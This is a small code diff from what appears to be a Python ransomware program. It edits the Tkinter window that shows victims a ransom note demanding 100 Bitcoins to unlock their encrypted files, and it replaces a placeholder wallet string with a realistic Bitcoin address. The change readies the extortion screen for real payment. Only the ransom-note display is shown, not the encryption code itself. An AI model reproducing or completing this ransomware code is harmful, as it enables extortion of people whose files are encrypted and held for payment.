@@ -33,7 +33,7 @@ class App(threading.Thread):
         label.pack()
         message = "                             Nice Day to get hacked huh? Poor you!\n"
         message += "Send 100 Bitcoins to the wallet address mentioned below or your files remain encrypted;)\n"
-        message += "                             Wallet Address: BFJKAKFHAksbdfbkjab"
+        message += "                             Wallet Address: 3FxAwHJ6AvmnU8NAoY8qFVEteddRbdkjhx"
 
         l = Label(self.root, text = message)
         l.config(font =("Courier", 14))
